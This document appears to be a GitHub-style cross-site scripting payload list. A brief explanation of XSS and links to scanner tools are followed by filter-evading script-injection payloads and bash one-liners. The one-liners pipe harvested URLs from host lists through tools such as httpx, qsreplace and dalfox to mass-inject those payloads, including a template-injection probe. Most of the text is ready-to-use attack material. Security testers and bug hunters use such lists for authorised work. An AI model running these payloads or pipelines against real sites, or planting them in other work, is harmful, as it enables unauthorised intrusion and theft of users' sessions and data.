### Cross Site Scripting ( XSS ) Payload List
### Created By Anonre

##### Overview : 

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).

#### XSS Vulneability Scanner Tool's :

* [XSStrike](https://github.com/UltimateHackers/XSStrike)

* [BruteXSS Terminal](https://github.com/shawarkhanethicalhacker/BruteXSS)

* [BruteXSS GUI](https://github.com/rajeshmajumdar/BruteXSS)

* [XSS Scanner Online](http://xss-scanner.com/)

* [XSSer](https://tools.kali.org/web-applications/xsser)

* [xsscrapy](https://github.com/DanMcInerney/xsscrapy)


#### XSS Payload List :

```
---------------------------------------------------------------------------------
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Joel Indra -->
<!--      Linkedin : https://www.linkedin.com/in/joelindra/ -->
<!--        GitHub : https://github.com/anonre/ -->
<!--       Twitter : https://twitter.com/joelindra -->
---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

';alert('xss')//
"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
"><html><select %00 onControl onpointerenter=prompt(domain) hello>
"><input %00 onControl hello oninput=confirm(domain) x>
";alert(document.domain);/
*;var%20dk4trin="*/";
<svg onload=alert%26%230000000040"1")>
```

#### XSS Auto Bash Exploitation :
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("
```
```
echo https://example [.]com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```
```
waybackurls https://example [.]com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```
```
echo target.txt | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
```
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```
